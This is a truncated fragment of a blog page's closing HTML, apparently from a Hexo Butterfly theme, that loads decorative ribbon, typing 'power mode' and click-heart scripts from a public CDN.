class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script></div></body></html>
